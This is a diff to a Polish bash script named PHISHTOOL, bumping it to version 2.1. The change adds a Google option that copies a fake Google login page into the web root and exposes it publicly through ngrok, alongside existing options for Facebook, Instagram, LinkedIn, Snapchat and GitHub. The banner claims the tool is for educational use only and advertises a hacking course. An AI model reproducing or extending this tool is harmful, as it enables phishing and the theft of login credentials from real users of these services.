@@ -55,16 +55,27 @@ github_login_page()
 	sudo rm /var/www/html/index.html
 }
 
+google_login_page()
+{
+	echo "wybrales Google";
+	sudo rm /var/www/html/index.html
+	sudo cp google/index.html /var/www/html/index.html
+	./ngrok http 80
+	sudo rm /var/www/html/index.html
+
+}
+
 exit_work()
 {
 	exit
 }
 
-figlet PHISHTOOL 2.0
+figlet PHISHTOOL 2.1
 echo " ------------------------------------------------------------------------------ "
-echo "   Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 2.0"
+echo "   Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 2.1"
 echo " ------------------------------------------------------------------------------ "
 echo -e "\e[5m  KUP KURS NA WWW.EHAKER.PL \e[0m"
+echo -e "\e[5m  KUP KURS NA WWW.EHACKING.PL \e[0m"
 echo "Wybierz opcje"
 echo "================="
 echo -e "\e[31m  [1] Facebook\e[0m"
@@ -73,6 +84,7 @@ echo -e "\e[31m  [3] Linkedin\e[0m"
 echo -e "\e[31m  [4] Instagram\e[0m"
 echo -e "\e[31m  [5] Snapchat\e[0m"
 echo -e "\e[31m  [6] Github\e[0m"
+echo -e "\e[31m  [7] Google\e[0m"
 echo -e "\e[92m  [11] EXIT \e[0m"
 echo "================="
 
@@ -89,6 +101,7 @@ case "$opcja" in
   "4") instagram_login_page ;;
   "5") snapchat_login_page ;;
   "6") github_login_page ;;
+  "7") google_login_page ;;
   "11") exit_work ;;
   *)  ./run.sh
   
